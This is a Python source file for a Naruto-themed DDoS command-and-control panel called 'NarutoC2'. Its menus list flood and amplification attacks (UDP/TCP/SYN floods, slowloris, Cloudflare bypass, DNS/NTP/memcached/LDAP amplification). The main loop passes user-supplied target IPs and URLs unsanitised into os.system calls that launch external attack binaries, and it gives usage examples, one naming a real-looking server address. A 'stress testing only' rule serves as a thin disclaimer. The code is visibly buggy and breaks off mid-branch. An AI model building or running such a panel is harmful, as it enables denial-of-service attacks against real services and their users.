##############################
# NarutoC2 Made by NarutoC2  #
# COPY = FORBIDDEN           #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.6)
    clear()
    print(f'''... / **/|        
     | == /        
      |  |                  
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;255;140;0m[ \x1b[38;2;255;255;255mNarutoC2 \x1b[38;2;255;140;0m] | \x1b[38;2;255;255;255mWelcome to NarutoC2 PN! \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mOwner: NarutoC2 \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mUpdate v2.0')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║     \x1b[38;2;30;144;255mTools     \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mgeoip               \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mreverse-dns           \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mreverseip           \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255msubnet-lookup         \x1b[38;2;255;140;0m║  
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255masn-lookup          \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mdns-lookup            \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mport-scan           \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mwhois                 \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mping                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mtraceroute            \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║     \x1b[38;2;30;144;255mBanners   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mtroll               \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mnaruto                \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mpikachu             \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mkurama                \x1b[38;2;255;140;0m║  
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255msasuke              \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mrasengan              \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mdragon              \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mchidori               \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mramen               \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mleaf-village          \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║     \x1b[38;2;30;144;255mRules     \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m1. Follow the ninja way - never give up!      \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m3. Only attack stress testing servers         \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m4. Don't skid the panel - create your own!    \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m5. Protect the Hidden Leaf Village            \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m6. The creator does not do any harm           \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║     \x1b[38;2;30;144;255mPorts     \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m21 - \x1b[38;2;30;144;255mFTP/SFTP   \x1b[38;2;255;140;0m69   - \x1b[38;2;30;144;255mTFTP      \x1b[38;2;255;140;0m5060  - \x1b[38;2;30;144;255mSIP  \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m22 - \x1b[38;2;30;144;255mSSH        \x1b[38;2;255;140;0m80   - \x1b[38;2;30;144;255mHTTP      \x1b[38;2;255;140;0m30120 - \x1b[38;2;30;144;255mFIVEM\x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m23 - \x1b[38;2;30;144;255mTELNET     \x1b[38;2;255;140;0m443  - \x1b[38;2;30;144;255mHTTPS     \x1b[38;2;255;140;0m27015 - \x1b[38;2;30;144;255mSTEAM\x1b[38;2;255;140;0m║   
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m25 - \x1b[38;2;30;144;255mSMTP       \x1b[38;2;255;140;0m3074 - \x1b[38;2;30;144;255mXBOX      \x1b[38;2;255;140;0m25565 - \x1b[38;2;30;144;255mMCRAFT\x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m53 - \x1b[38;2;30;144;255mDNS        \x1b[38;2;255;140;0m5060 - \x1b[38;2;30;144;255mPLAYSTN   \x1b[38;2;255;140;0m7777  - \x1b[38;2;30;144;255mSAMP \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;255;140;0m110- \x1b[38;2;30;144;255mPOP3       \x1b[38;2;255;140;0m993  - \x1b[38;2;30;144;255mIMAPS     \x1b[38;2;255;140;0m19132 - \x1b[38;2;30;144;255mMCPE \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚═══════════════════════════════════════════════╝
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;140;0m╔═══════════════╗
                                \x1b[38;2;255;140;0m║    \x1b[38;2;30;144;255mSpecial    \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mstress              \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mc2dragon              \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255madvanced-stress     \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255menhanced-c2dragon     \x1b[38;2;255;140;0m║  
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mmulti-vector        \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mrasengan-barrage      \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mshadow-clone        \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mchidori-stream        \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255mbyakugan-scan       \x1b[38;2;255;140;0m║  \x1b[38;2;30;144;255msharingan-genjutsu    \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚══════════════════════╩════════════════════════╝
''')
    
def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;255;140;0m╔═══════════════╗
                              \x1b[38;2;255;140;0m║    \x1b[38;2;30;144;255mLayer 7    \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttp-raw            \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mcrash             \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttp-socket         \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttpflood         \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttp-storm          \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mcf-socket         \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttp-rand           \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mcf-pro            \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255moverflow            \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhyper             \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mcf-bypass           \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mslow              \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255muambypass           \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttps-spoof       \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255movh-raw             \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255movh-beam          \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhttp2-flood         \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mwebsocket-flood   \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;255;140;0m╔═══════════════╗
                              \x1b[38;2;255;140;0m║    \x1b[38;2;30;144;255mLayer 4    \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mudp                 \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mtcp               \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mnfo-killer          \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mstd               \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mudpbypass           \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mdestroy           \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mhome                \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mgod               \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mslowloris           \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mflux              \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mstdv2               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mudp-reflection    \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mtcp-syn             \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255micmp-flood        \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╚═══════════════════════╩═════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;255;140;0m╔═══════════════╗
                              \x1b[38;2;255;140;0m║\x1b[38;2;30;144;255m AMP's \x1b[38;2;255;140;0m/ \x1b[38;2;30;144;255mGames \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255movh-amp             \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mntp-amp           \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mminecraft           \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mldap              \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255msamp                \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mdns-amp           \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mchargen             \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mmemcached         \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255msnmp                \x1b[38;2;255;140;0m║   \x1b[38;2;30;144;255mssdp              \x1b[38;2;255;140;0m║
               \x1b[38;2;255;140;0m╚═══════════════════════╩═════════════════════╝
''')

def menu():
    sys.stdout.write(f"         \x1b]2;NarutoC2 C2 --> Shinobi: [{bots}] | Online: [1] | Jutsu:  | Bypass:  | Amps: \x07")
    clear()
    print('\x1b[38;2;255;140;0m[ \x1b[38;2;255;255;255mNarutoC2 \x1b[38;2;255;140;0m] | \x1b[38;2;255;255;255mWelcome to NarutoC2 C2! \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mOwner: NarutoC2 \x1b[38;2;255;140;0m| \x1b[38;2;255;255;255mUpdate v2.0')
    print("")
    print("""
                        \x1b[38;2;255;140;0m███╗   ██╗ █████╗ ██████╗ ██╗   ██╗████████╗ ██████╗ 
                        \x1b[38;2;255;140;0m████╗  ██║██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗
                        \x1b[38;2;255;165;0m██╔██╗ ██║███████║██████╔╝██║   ██║   ██║   ██║   ██║
                        \x1b[38;2;255;165;0m██║╚██╗██║██╔══██║██╔══██╗██║   ██║   ██║   ██║   ██║
                        \x1b[38;2;255;140;0m██║ ╚████║██║  ██║██║  ██║╚██████╔╝   ██║   ╚██████╔╝
                        \x1b[38;2;255;140;0m╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
                        \x1b[38;2;30;144;255m                    ╔═╗██████╗ 
                        \x1b[38;2;30;144;255m                    ║  ╚════██╗
                        \x1b[38;2;30;144;255m                    ╚═╗ █████╔╝
                        \x1b[38;2;30;144;255m                      ║██╔═══╝ 
                        \x1b[38;2;30;144;255m                    ╚═╝███████╗
                        \x1b[38;2;30;144;255m                       ╚══════╝
                \x1b[38;2;255;140;0m╔════════════════════════════════════════════════╗
                \x1b[38;2;255;140;0m║          \x1b[38;2;255;255;255mWelcome to NarutoC2 C2 DDoS Panel        \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m║ \x1b[38;2;30;144;255m- - - - - - \x1b[38;2;255;255;255mAdvanced DDoS Panel 2025\x1b[38;2;255;140;0m - - - - - -\x1b[38;2;30;144;255m║
                \x1b[38;2;255;140;0m╚════════════════════════════════════════════════╝
                \x1b[38;2;255;140;0m╔════════════════════════════════════════════════╗
                \x1b[38;2;255;140;0m║   \x1b[38;2;255;255;255m🍃 Type help to see all ninja techniques! 🍃   \x1b[38;2;255;140;0m║
                \x1b[38;2;255;140;0m╚════════════════════════════════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;140;0m╔══[\x1b[38;2;30;144;255mHokage\x1b[38;2;255;140;0m@\x1b[38;2;255;165;0mNaruto\x1b[38;2;255;140;0mC2\x1b[38;2;30;144;255m]
\x1b[38;2;255;140;0m╚\x1b[38;2;255;165;0m═\x1b[38;2;30;144;255m═\x1b[38;2;255;140;0m═\x1b[38;2;255;165;0m═\x1b[38;2;30;144;255m➤ \x1b[38;2;255;255;255m🍥 ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specialS" or cnc == "SPECIALS":
            special()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# ENHANCED C2 DRAGON FEATURE
        elif "c2dragon" in cnc or "enhanced-c2dragon" in cnc:
            print('''
\x1b[38;2;255;140;0m         ██████╗  ██████╗      ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗
\x1b[38;2;255;140;0m        ██╔═══██╗██╔════╝     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║
\x1b[38;2;255;165;0m        ██║   ██║██║  ███╗    ██║   ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║
\x1b[38;2;255;165;0m        ██║   ██║██║   ██║    ██║   ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║
\x1b[38;2;255;140;0m        ╚██████╔╝╚██████╔╝    ╚██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║
\x1b[38;2;255;140;0m         ╚═════╝  ╚═════╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝

\x1b[38;2;255;255;0m    🐉 Deidara's Enhanced C2 Dragon unleashed! 🐉
\x1b[38;2;255;255;255m    Launching massive clay dragon bombs for sustained bombardment...
\x1b[38;2;255;140;0m    💥 KATSU! Art is an explosion! 💥
''')

# LAYER 4 METHODS   
        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()
                time = cnc.split()
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python3 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()
                time = cnc.split()
                conns = cnc.split()
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()
                time = cnc.split()
                conns = cnc.split()
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

# NEW LAYER 4 METHODS
        elif "tcp-syn" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./tcp-syn {ip} {port} {threads} {time}')
            except IndexError:
                print('Usage: tcp-syn <ip> <port> <threads> <time>')
                print('Example: tcp-syn 1.1.1.1 80 500 60')

        elif "icmp-flood" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()
                os.system(f'./icmp-flood {ip} {threads} {time}')
            except IndexError:
                print('Usage: icmp-flood <ip> <threads> <time>')
                print('Example: icmp-flood 1.1.1.1 300 60')

        elif "udp-reflection" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./udp-reflection {ip} {port} {threads} {time}')
            except IndexError:
                print('Usage: udp-reflection <ip> <port> <threads> <time>')
                print('Example: udp-reflection 1.1.1.1 53 400 60')

# SPECIAL METHODS
        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()
                conn = cnc.split()
                time = cnc.split()
                out = cnc.split()
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('       HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')

# NEW SPECIAL METHODS
        elif "advanced-stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()
                threads = cnc.split()
                time = cnc.split()
                os.system(f'python3 advanced-stress.py {ip} {port} {mode} {threads} {time}')
            except IndexError:
                print('Usage: advanced-stress <ip> <port> <mode> <threads> <time>')
                print('MODE: TCP/UDP/HTTP/HTTPS/MIXED')
                print('Example: advanced-stress 1.1.1.1 80 MIXED 1000 60')

        elif "multi-vector" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                intensity = cnc.split()
                os.system(f'python3 multi-vector.py {ip} {time} {intensity}')
            except IndexError:
                print('Usage: multi-vector <ip> <time> <intensity>')
                print('INTENSITY: LOW/MEDIUM/HIGH/EXTREME')
                print('Example: multi-vector 1.1.1.1 60 HIGH')

        elif "shadow-clone" in cnc:
            try:
                target = cnc.split()[1]
                clones = cnc.split()[2]
                time = cnc.split()
                os.system(f'python3 shadow-clone.py {target} {clones} {time}')
            except IndexError:
                print('Usage: shadow-clone <target> <clones> <time>')
                print('Example: shadow-clone http://example.com 1000 60')

        elif "rasengan-barrage" in cnc:
            try:
                url = cnc.split()[1]
                power = cnc.split()[2]
                time = cnc.split()
                os.system(f'node rasengan-barrage.js {url} {power} {time}')
            except IndexError:
                print('Usage: rasengan-barrage <url> <power> <time>')
                print('POWER: 1-10 (10 = Nine-Tails Chakra)')
                print('Example: rasengan-barrage http://example.com 8 60')

        elif "chidori-stream" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                voltage = cnc.split()
                time = cnc.split()
                os.system(f'./chidori-stream {ip} {port} {voltage} {time}')
            except IndexError:
                print('Usage: chidori-stream <ip> <port> <voltage> <time>')
                print('VOLTAGE: 1000-10000 (Higher = More Lightning)')
                print('Example: chidori-stream 1.1.1.1 80 5000 60')

        elif "byakugan-scan" in cnc:
            try:
                target = cnc.split()[1]
                depth = cnc.split()[2]
                os.system(f'python3 byakugan-scan.py {target} {depth}')
            except IndexError:
                print('Usage: byakugan-scan <target> <depth>')
                print('DEPTH: SURFACE/DEEP/COMPLETE')
                print('Example: byakugan-scan example.com DEEP')

        elif "sharingan-genjutsu" in cnc:
            try:
                target = cnc.split()[1]
                illusion = cnc.split()[2]
                time = cnc.split()
                os.system(f'python3 sharingan-genjutsu.py {target} {illusion} {time}')
            except IndexError:
                print('Usage: sharingan-genjutsu <target> <illusion> <time>')
                print('ILLUSION: BASIC/ADVANCED/MANGEKYOU')
                print('Example: sharingan-genjutsu http://example.com ADVANCED 60')
                
# AMP/GAMES METHODS
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python3 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()
                time = cnc.split()
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp-amp" in cnc or "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()
                time = cnc.split()
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp-amp <ip> <port> <throttle> <time>')
                print('Example: ntp-amp 1.1.1.1 123 250 60')

# NEW AMP METHODS
        elif "dns-amp" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()
                os.system(f'./dns-amp {ip} {threads} {time}')
            except IndexError:
                print('Usage: dns-amp <ip> <threads> <time>')
                print('Example: dns-amp 1.1.1.1 500 60')

        elif "memcached" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()
                time = cnc.split()
                os.system(f'./memcached-amp {ip} {port} {threads} {time}')
            except IndexError:
                print('Usage: memcached <ip> <port> <threads> <time>')
                print('Example: memcached 1.1.1.1 11211 300 60')

        elif "chargen" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()
                os.system(f'./chargen-amp {ip} {threads} {time}')
            except IndexError:
                print('Usage: chargen <ip> <threads> <time>')
                print('Example: chargen 1.1.1.1 400 60')

        elif "snmp" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()
                os.system(f'./snmp-amp {ip} {threads} {time}')
            except IndexError:
                print('Usage: snmp <ip> <threads> <time>')
                print('Example: snmp 1.1.1.1 350 60')

        elif "ssdp" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()
                os.system(f'./ssdp-amp {ip} {threads} {time}')
            except IndexError:
                print('Usage: ssdp <ip> <threads> <time>')
                print('Example: ssdp 1.1.1.1 450 60')

# LAYER 7 METHODS
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()
                time = cnc.split() 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://example.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
